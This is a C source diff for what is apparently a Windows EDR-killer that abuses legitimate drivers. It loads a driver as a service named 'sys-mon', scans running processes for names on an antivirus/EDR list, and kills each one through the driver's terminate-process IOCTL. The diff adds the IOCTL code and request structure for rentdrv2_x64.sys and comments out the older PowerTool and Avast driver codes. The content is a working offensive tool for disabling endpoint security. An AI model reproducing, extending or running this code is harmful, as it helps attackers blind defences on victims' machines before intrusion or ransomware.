@@ -5,10 +5,14 @@
 #include <tlhelp32.h>
 
 // kEvP64.sys - anti-virus & anti-rootkit driver by PowerTool
-#define IOCTL_TERMINATE_PROCESS 0x222034
+//#define IOCTL_TERMINATE_PROCESS 0x222034
 
 // AswArPot.sys - anti-rootkit driver by Avast
-// #define IOCTL_TERMINATE_PROCESS 0x9988c094
+//#define IOCTL_TERMINATE_PROCESS 0x9988c094
+
+// rentdrv2_x64.sys
+#define IOCTL_TERMINATE_PROCESS 0x22E010
+#pragma pack ( 1 )
 
 const char* g_serviceName = "sys-mon";
 
@@ -44,6 +48,20 @@ const char* const g_avedrlist[] = {
 };
 
 int g_avedrlistSize = sizeof(g_avedrlist) / sizeof(g_avedrlist[0]);
+
+typedef struct RentDrivStruct {
+
+	/*
+		1 - Kill a process by PID
+		2 - Kill a process by name
+		3 - Kill a process and childs by the parent process name
+	*/
+	UINT level; // Required field !
+	SIZE_T pid; // Optional based on level
+	wchar_t path[1024]; // Optional based on level
+
+} _RentDrivStruct, * PRentDrivStruct;
+
 
 BOOL loadDriver(char* driverPath) {
 	SC_HANDLE hSCM, hService;
@@ -144,7 +162,13 @@ DWORD checkEDRProcesses(HANDLE hDevice) {
 
 				if (isInavEdrlist(exeName)) {
 					procId = (unsigned int)pE.th32ProcessID;
-					if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &procId, sizeof(procId), &pOutbuff, sizeof(pOutbuff), &bytesRet, NULL))
+
+					RentDrivStruct driverIoctl;
+					driverIoctl.level = 1;
+					driverIoctl.pid = procId;
+
+					//if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &procId, sizeof(procId), &pOutbuff, sizeof(pOutbuff), &bytesRet, NULL))
+					if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &driverIoctl, sizeof(RentDrivStruct), NULL, NULL, NULL, NULL))
 						printf("failed to terminate %ws !!!\n", pE.szExeFile);
 					else {
 						printf("terminated %ws\n", pE.szExeFile);
@@ -189,10 +213,13 @@ int main(void) {
 	printf("driver loaded.\n");
 
 	// kEvP64.sys - anti-virus & anti-rootkit driver by PowerTool
-	HANDLE hDevice = CreateFile(L"\\\\.\\KevP64", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	//HANDLE hDevice = CreateFile(L"\\\\.\\KevP64", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	// AswArPot.sys - anti-rootkit driver by Avast
-	//HANDLE hDevice = CreateFile(L"\\\\.\\aswSP_Avar", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	// HANDLE hDevice = CreateFile(L"\\\\.\\aswSP_Avar", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	// rentdrv2_x64.sys
+	HANDLE hDevice = CreateFile(L"\\\\.\\rentdrv2", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
 
 	if (hDevice == INVALID_HANDLE_VALUE) {
 		printf("Failed to open handle to the driver!!!");
